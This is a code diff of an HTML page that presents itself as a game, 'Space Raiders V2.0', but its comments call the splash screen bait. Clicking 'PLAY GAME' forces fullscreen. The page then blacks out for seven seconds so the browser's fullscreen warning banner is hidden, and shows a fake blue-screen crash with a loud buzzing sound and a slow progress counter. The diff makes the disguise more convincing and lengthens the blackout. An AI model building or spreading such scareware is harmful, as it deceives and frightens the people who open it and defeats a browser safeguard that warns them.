@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Space Raiders V2.0 - Loading...</title>
+    <title>Space Raiders V2.0 - Launching...</title>
     <style>
         html, body {
             margin: 0 !important; padding: 0 !important; width: 100vw !important; height: 100vh !important;
@@ -11,20 +11,25 @@
             background-color: #000000; position: fixed; top: 0; left: 0; z-index: 999999;
         }
 
-        /* BOOT INTERFACE MASK - GIVES THEM AN INNOCENT ACTION TO UNLOCK FULLSCREEN NATIVELY */
+        /* STAGE 0: STANDALONE BAIT INTERFACE MASK MATCHING THE GOOGLE SITE */
         #interactive-mask {
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background-color: #0c0c12; width: 100vw; height: 100vh; cursor: pointer; color: #ffffff;
-            text-align: center; box-sizing: border-box;
+            background: linear-gradient(135deg, #1e1e2f 0%, #0f0f1a 100%); width: 100vw; height: 100vh; 
+            cursor: pointer; color: #ffffff; text-align: center; box-sizing: border-box;
         }
-        #interactive-mask h2 { font-size: 2rem; margin-bottom: 5px; color: #00d2ff; text-transform: uppercase; letter-spacing: 2px; }
-        #interactive-mask p { font-size: 1rem; color: #707080; margin-bottom: 30px; }
-        .initialize-btn {
-            padding: 15px 45px; font-size: 1.2rem; font-weight: bold; color: white; background-color: #ff4757;
-            border: none; border-radius: 5px; box-shadow: 0 0 15px rgba(255, 71, 87, 0.3);
+        #interactive-mask h1 { 
+            font-size: 3.5rem; margin: 0 0 10px 0; letter-spacing: 2px; text-transform: uppercase; 
+            text-shadow: 0 0 15px rgba(0, 168, 255, 0.6); 
         }
+        #interactive-mask p { font-size: 1.2rem; color: #a0a0b8; margin: 0 0 40px 0; }
+        .play-btn {
+            padding: 18px 60px; font-size: 1.6rem; font-weight: bold; color: #ffffff;
+            background: #ff4757; border: none; border-radius: 50px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4); transition: transform 0.2s;
+        }
+        .play-btn:active { transform: scale(0.98); }
 
-        /* STAGE 1: LONG BLACKOUT WINDOW HIDES TRANSITIONS & BROWSER POPUPS */
+        /* STAGE 1: EXTENDED BLACKOUT WINDOW HIDES TRANSITIONS & BROWSER POPUPS */
         #loading-blackout {
             display: none; background-color: #000000; width: 100vw; height: 100vh;
         }
@@ -53,14 +58,14 @@
 </head>
 <body>
 
-    <!-- STAGE 0: ACTION LOBBY THAT UNLOCKS BROWSERS AUDIO & FULLSCREEN CONTROLS -->
+    <!-- STAGE 0: RECONFIGURED MAIN LOBBY SPLASH MASK -->
     <div id="interactive-mask" onclick="triggerNativeFullscreen()">
-        <h2>Engine Initialize</h2>
-        <p>Assets synchronized. Click anywhere to activate screen optimization layout.</p>
-        <button class="initialize-btn">INITIALIZE CORE</button>
+        <h1>Space Raiders V2.0</h1>
+        <p>Assets verified. Click below to launch engine executable.</p>
+        <button class="play-btn">PLAY GAME</button>
     </div>
 
-    <!-- STAGE 1: DELAY BUFFER MASK -->
+    <!-- STAGE 1: EXTENDED DELAY BUFFER MASK -->
     <div id="loading-blackout"></div>
 
     <!-- STAGE 2: LIVE CRASH FACE -->
@@ -94,24 +99,24 @@
 
     <script>
         function triggerNativeFullscreen() {
-            // Forces native full-screen mode properties directly from the user click action
+            // Force true full screen properties directly on click action
             const doc = document.documentElement;
             if (doc.requestFullscreen) doc.requestFullscreen();
             else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
             else if (doc.mozRequestFullScreen) doc.mozRequestFullScreen();
 
-            // Clear out interface mask and activate the dark screen buffer sequence
+            // Clear layout mask and activate the dark loader
             document.getElementById('interactive-mask').style.display = 'none';
             document.getElementById('loading-blackout').style.display = 'block';
 
-            // 4 seconds of black screen allows the browser notification to show and hide inside pitch darkness
+            // Hold black screen for 7 seconds so the browser's full-screen banner completely hides
             setTimeout(function() {
                 document.getElementById('loading-blackout').style.display = 'none';
                 document.getElementById('bsod-screen').style.display = 'flex';
 
                 startMaxHardwareBuzzSound();
                 startSlowPercentageCounter();
-            }, 4000); 
+            }, 7000); 
         }
 
         function startSlowPercentageCounter() {
